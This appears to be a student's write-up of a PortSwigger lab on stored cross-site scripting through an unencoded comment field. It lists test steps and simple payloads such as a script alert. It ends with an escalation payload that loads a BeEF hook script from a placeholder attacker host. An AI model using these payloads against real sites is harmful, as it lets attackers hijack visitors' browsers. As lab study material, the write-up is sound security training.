# Lab: Stored XSS

[Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

---

# Lab Objective

Execute arbitrary JavaScript in the browsers of all users who view the affected page.

---

# Vulnerable Functionality

The application allows users to submit input (ccomments) that is stored server-side and later rendered in an HTML context without any output encoding or sanitization.

---

## Testing Methodology

1. Identify input fields that accept user-supplied data and store it server-side (e.g., comments, profile fields).
2. Observed behavior: The payload `YOUWE<'` is reflected verbatim in the HTML response, confirming unencoded output in an HTML context.
3. Submit basic HTML payloads to determine whether input is rendered unencoded. such as `<img src=s >`
4. Inject simple JavaScript payloads to test for script execution.
5. Reload or revisit the affected page to confirm the payload is persistently stored.
6. Observe browser behavior to verify successful JavaScript execution.
7. Confirm that the payload executes for all users who view the affected page, not only the attacker.

---

## Exploitation Walkthrough
1. Submit crafted input in comments field
2. Payload is store in response
3. JavaScript executed in browser context

---

## Payload Used
- YOUWE<' *(used to confirm reflection and HTML context)*
- `<img src=s >`
- `<script>alert(1)</script>`

## Post-Exploitation (Conceptual): BeEF Framework
Although the lab focuses on basic JavaScript execution, this Stored XSS vulnerability **can be escalated** to advanced client-side exploitation using tools such as the **BeEF (Browser Exploitation Framework)**.

### Example Escalation Payload
`<script src="http://ATTACKER_IP:3000/hook.js"></script>`
